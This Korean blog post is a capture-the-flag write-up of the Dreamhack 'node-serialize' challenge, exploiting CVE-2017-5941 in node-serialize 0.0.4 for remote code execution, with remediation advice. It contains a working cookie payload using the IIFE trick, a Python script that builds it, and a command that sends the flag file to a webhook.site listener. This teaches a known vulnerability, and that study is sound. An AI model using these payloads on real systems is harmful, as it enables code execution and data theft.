---
layout: post
title:  "Dreamhack 워게임 node-serialize 풀이 — CVE-2017-5941 IIFE 트릭으로 RCE, 쿠키 한 줄로 플래그 유출"
date:   2026-05-19 17:30:00 +0900
categories: security web wargame dreamhack writeup nodejs deserialization rce cve-2017-5941
---

## 들어가며

Dreamhack 웹해킹 워게임 **node-serialize** (난이도 별 1, 풀이자 412명) 풀이입니다. 이름이 모든 걸 말해주는 문제예요 — `node-serialize` npm 패키지의 **CVE-2017-5941: IIFE 트릭으로 임의 코드 실행 (RCE)**.

문제 설명:

> Node로 구현된 간단한 서버입니다. 취약점을 찾아 Flag를 획득하세요!
> Flag는 /app/flag 에 있습니다. ( 플래그형식은 FLAG{} 입니다. )
> [언인텐 패치] - 2022.12.01

스포일러 결론(요약):

1. `profile` 쿠키에 들어 있는 base64 문자열을 서버가 `node-serialize.unserialize()` 로 역직렬화한다.
2. `_$$ND_FUNC$$_` 마커가 붙은 함수 문자열은 `eval` 로 실행되는데, 함수 뒤에 `()` 까지 붙여놓으면 **역직렬화 시점에 그 함수가 즉시 실행** 된다 (IIFE).
3. 그 안에서 `child_process.exec` 로 `/app/flag` 를 webhook 으로 POST 해서 받아온다.

획득한 플래그: **`FLAG{RCE_with_N0d3_deserialization_Vu1n}`**.

## 1. 자료 파악

ZIP 구성:

```
Dockerfile           (node:18-alpine + curl)
package.json         dependencies: express, cookie-parser, node-serialize@0.0.4
package-lock.json
index.js             ★ 본체
flag                 FLAG{This_is_fake_flag}  (실제 플래그는 서버 측에 별도)
```

`index.js` 전체:

```javascript
const express = require('express');
const cookieParser = require('cookie-parser');
const serialize = require('node-serialize');
const app = express();
app.use(cookieParser())

app.get('/', (req, res) => {
    if (req.cookies.profile) {
        let str = new Buffer.from(req.cookies.profile, 'base64').toString();

        // Special Filter For You :)

        let obj = serialize.unserialize(str);
        if (obj) {
            res.send("Set Cookie Success!");
        }
    } else {
        res.cookie('profile', "eyJ1c2VybmFtZSI6ICJndWVzdCIsImNvdW50cnkiOiAiS29yZWEifQ==", {
            maxAge: 900000, httpOnly: true
        });
        res.redirect('/');
    }
});

app.listen(5000);
```

`// Special Filter For You :)` 라는 코멘트가 있지만 **실제 필터 코드는 한 줄도 없습니다**. 출제자가 일부러 비워둔 흔적인지, 언인텐 패치 때 빠진 건지는 알 수 없지만, 아무튼 우리에게 유리한 상황. 처음 접속하면 기본 쿠키를 심어주고, 두 번째 접속부터는 그 쿠키를 받아서 그대로 unserialize 합니다.

`node-serialize` 의 기본 cookie 값을 base64 디코드해보면:

```
{"username": "guest","country": "Korea"}
```

평범한 JSON. 그래서 처음엔 "그냥 JSON parser 인가?" 싶지만, `node-serialize` 는 **그 이상** 을 합니다.

## 2. `node-serialize` 가 함수까지 직렬화한다는 점

JSON 만으로는 자바스크립트 함수를 표현할 수 없습니다. `JSON.stringify(function(){...})` → `undefined`. 그래서 일부 라이브러리들은 함수를 `function() { ... }.toString()` 한 결과 문자열에 **특별한 마커** 를 붙여서 직렬화하고, 역직렬화할 때 `eval` 로 다시 함수로 되돌립니다. `node-serialize` 의 마커는 `_$$ND_FUNC$$_`.

라이브러리의 `lib/serialize.js` 핵심 부분:

```javascript
exports.unserialize = function(obj, originObj) {
    var out = JSON.parse(obj);
    ...
    for (k in out) {
        if (typeof out[k] === 'string' && out[k].indexOf(FUNCFLAG) === 0) {
            out[k] = eval('(' + out[k].substring(FUNCFLAG.length) + ')');
        }
        ...
    }
    return out;
};
```

여기서 우리가 통제할 수 있는 게 두 가지:

- **`_$$ND_FUNC$$_` 가 prefix 인 문자열을 우리가 넣을 수 있다** (쿠키니까).
- 그러면 그 뒤 본문 전체를 **`eval('(' + 본문 + ')')`** 로 실행한다.

함수 본문 끝에 `()` 만 붙이면, `eval('(function(){...})')` 가 아니라 `eval('(function(){...}())')` 가 되어서 함수가 **정의되자마자 즉시 실행** 됩니다. 이게 그 유명한 IIFE — Immediately Invoked Function Expression — 트릭.

> 즉 `node-serialize` 는 "함수 직렬화" 라는 기능을 안전하게 만드는 건 처음부터 포기하고 `eval` 로 처리했고, 이걸 신뢰할 수 없는 사용자 입력에 그대로 적용하면 RCE 가 된다는 게 CVE-2017-5941 의 한 줄 요약.

## 3. 페이로드 설계

### 3.1 어떤 모양이어야 하나

JSON 객체 안에 함수 한 개. 함수 본문은 `child_process.exec` 로 명령 실행:

```json
{"x": "_$$ND_FUNC$$_function(){require('child_process').exec('<COMMAND>')}()"}
```

핵심 포인트:

- 값이 문자열 형태로 시작 — `_$$ND_FUNC$$_` 마커가 prefix 여야 한다.
- 함수 표현식 뒤에 `()` 가 있어야 unserialize 시점에 실행된다.
- 본문은 `eval` 안으로 들어가므로 일반 자바스크립트 문법이면 뭐든 OK.

### 3.2 flag 를 어떻게 가져오나

서버 응답은 `res.send("Set Cookie Success!")` 한 줄뿐 — 우리가 실행한 명령의 stdout 을 응답에 실어주지 않습니다. 그래서 **out-of-band exfiltration** 이 필요. 가장 쉬운 방법은 webhook.site 같은 무료 listener 로 POST 하는 것:

```bash
cat /app/flag | curl -s -X POST --data-binary @- https://webhook.site/<token>/serialize-flag
```

`--data-binary @-` 로 stdin 을 그대로 body 에 실으면 flag 의 trailing newline 까지 보존돼서 깔끔합니다.

### 3.3 페이로드 생성 (Python 으로 안전하게)

쉘 따옴표 escape 가 까다로워서 Python 으로 만드는 게 편합니다:

```python
import json, base64
WEBHOOK = "https://webhook.site/<token>/serialize-flag"

js = (
    "function(){"
    "require('child_process').exec("
    "'cat /app/flag | curl -s -X POST --data-binary @- " + WEBHOOK + "'"
    ")}()"
)

payload = {"x": "_$$ND_FUNC$$_" + js}
raw  = json.dumps(payload)
b64  = base64.b64encode(raw.encode()).decode()
print(b64)
```

## 4. 익스플로잇 실행

페이로드를 만들고 쿠키 헤더로 한 방 쏘면 끝:

```bash
curl -i "$SERVER/" -H "Cookie: profile=$B64"
# HTTP/1.1 200 OK
# ...
# Set Cookie Success!
```

응답에 별다른 정보는 없지만, webhook 을 확인하면:

```
POST .../serialize-flag
content: FLAG{RCE_with_N0d3_deserialization_Vu1n}
```

플래그 도착. ✅

### 4.1 한 단계씩 다시 따라가기

1. 브라우저(curl) → `GET /` + `Cookie: profile=<base64>`
2. 서버: `Buffer.from(profile, 'base64').toString()` → `{"x":"_$$ND_FUNC$$_function(){...}()"}` 복원
3. `serialize.unserialize(str)` 호출 → 내부에서 `JSON.parse` 로 객체화 → 각 키 순회
4. `x` 값이 `_$$ND_FUNC$$_` 로 시작 → 마커 제거한 뒤 `eval('(' + 'function(){...}()' + ')')` 실행
5. **`(function(){ ... }())`** — IIFE 가 즉시 실행되어 `child_process.exec` 호출
6. 컨테이너 안에서 `cat /app/flag | curl ... webhook.site/...` 가 실행되어 flag 가 webhook 으로 빠져나옴
7. 응답은 "Set Cookie Success!" — 공격자 입장에선 응답이 어쨌든 상관 없음, 이미 webhook 에 flag 가 도착했으니까

> 비유: 우편물 분류기가 발신자가 적어놓은 "메모지"를 읽고 그 내용을 그대로 자기 콘솔에 실행해주는 셈. "이 봉투의 내용물을 다른 주소로 다시 부쳐줘" 라고 적힌 메모지를 분류기가 그대로 따르는 것.

## 5. 안전하게 고치기

핵심은 **"신뢰할 수 없는 입력을 `unserialize` 에 넘기지 않는 것"**. 라이브러리 차원의 대응:

- `node-serialize` 패키지 자체가 비공식적으로 deprecate 상태. **`serialize-javascript`** (Yahoo 가 만든) 같은 안전한 대안으로 옮기는 게 정공법. 다만 `serialize-javascript` 도 옵션을 잘못 주면 비슷한 위험이 있으니 README 의 보안 섹션을 꼭 읽을 것.
- 함수 직렬화가 꼭 필요한 경우라면, **함수 정의는 서버 코드에서만** 하고, 직렬화 데이터는 함수의 "이름 또는 ID" 만 담아서 dispatcher 로 매핑하는 패턴이 안전.
- 쿠키처럼 신뢰할 수 없는 채널의 데이터는 무조건 **`JSON.parse` 같은 안전한 파서** 만 사용. 함수 복원 같은 "고급 기능" 은 같은 보안 경계 안에서만 쓰자.

추가로 일반적인 deserialization 보안 원칙 3가지:

1. **신뢰 경계를 그려라**. 어떤 데이터가 신뢰할 수 없는 곳에서 오는지 명시.
2. **역직렬화 = 코드 실행이라고 가정하라**. Python `pickle`, Java `ObjectInputStream`, PHP `unserialize`, Ruby `Marshal.load`, .NET `BinaryFormatter` 모두 동급의 위험.
3. **데이터 형식과 실행 형식을 분리하라**. JSON/Protobuf 처럼 "데이터" 만 표현할 수 있는 포맷을 선호.

## 6. 한 번 더 정리

### 6.1 취약점 카탈로그

| 단계 | 카테고리 | 원인 |
|---|---|---|
| 쿠키를 base64 디코드 후 unserialize | Trust Boundary 위반 | 신뢰할 수 없는 입력을 RCE-가능 함수에 전달 |
| `_$$ND_FUNC$$_` 마커 처리 | Insecure Deserialization (CWE-502) | 라이브러리가 `eval` 로 함수 복원 |
| IIFE `()` | Code Execution at Parse Time | `eval('(... ())')` 가 즉시 실행 |
| 응답에 stdout 미포함 → OOB 필요 | Blind Exploitation | 익스플로잇 자체와 무관하지만 데이터 회수 트릭 |

### 6.2 입문자가 챙겨가면 좋은 시각

- **"deserialize" 라는 이름이 보이면 일단 의심하자**. 언어/생태계 불문하고 역사적으로 가장 위협적인 패턴 중 하나.
- 사용자가 통제할 수 있는 입력을 `eval`, `Function`, `vm.runInNewContext`, `setTimeout(string, ...)` 같은 함수에 넘기는 코드는 다 같은 카테고리.
- 응답에 직접 출력이 없는 RCE 도 webhook 한 줄로 충분히 회수할 수 있다. **out-of-band exfiltration** 은 모든 blind injection 풀이의 공통 무기.

## 7. 시도했지만 실패한 것들 (회고)

이번엔 한 가지 작은 헛수고가 있었습니다.

### 7.1 첫 페이로드 — shell 안에서 따옴표 충돌로 JSON 깨짐

처음에는 bash 한 줄로 페이로드를 만들었습니다:

```bash
PAYLOAD='{"x":"_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"curl ... \"$(cat /app/flag)\"\")}()"}'
```

curl 명령 안의 `\"$(cat /app/flag)\"` 가 bash 의 `$()` 와 충돌해서 — bash 쪽에서 먼저 `$(...)` 가 실행되어 빈 문자열이 박혔습니다. 결과적으로 서버 측 JSON 파싱이 깨져서:

```
SyntaxError: Unexpected token $ in JSON at position 157
   at JSON.parse (<anonymous>)
   at exports.unserialize (/app/node_modules/node-serialize/lib/serialize.js:62:16)
```

라는 500 응답. 좋은 점은 **에러 메시지가 그대로 노출** 돼서 `serialize.js:62` 의 `JSON.parse` 단계에서 깨진 게 명확히 보였다는 것. "마커 처리 전 단계 자체가 안 됐다 → 페이로드 자체 문제" 라고 빠르게 판단할 수 있었음.

**회고**: 처음부터 Python 의 `json.dumps + base64` 로 만들었으면 1분 컷이었음. **레이어가 두 개 이상인 escape** (bash + JSON + base64 + URL) 는 처음부터 스크립트로 만드는 습관이 필요. 인터랙티브 쉘로 한 줄에 욱여넣다가 시간 잡아먹는 건 흔한 함정.

### 7.2 응답으로 stdout 받아오려는 첫 시도

처음에 잠깐 "응답 본문에 flag 가 그대로 나오게 할 순 없나?" 고민. `res.send` 가 호출되기 전에 `obj` 가 truthy 면 그대로 응답하므로, IIFE 가 객체를 return 하면 `obj` 가 그 값이 된다 — 단, `serialize.unserialize` 는 함수 호출 결과를 다시 객체에 박지 않고 그냥 obj 의 키를 함수 자체로 바꿉니다. 함수 안에서 `process.stdout` 으로 쓰면 컨테이너 stdout 일 뿐 응답에는 안 나옴. 그래서 **응답 본문 회수 경로는 일찍 포기** 하고 OOB 로 직행. 결과적으론 webhook 쪽이 훨씬 깔끔.

---

`node-serialize@0.0.4` 같은 deprecate 된 RCE 박물관 패키지는 production 에서 절대 만나지 마시고, 만나면 즉시 갈아치우는 것을 추천드립니다.
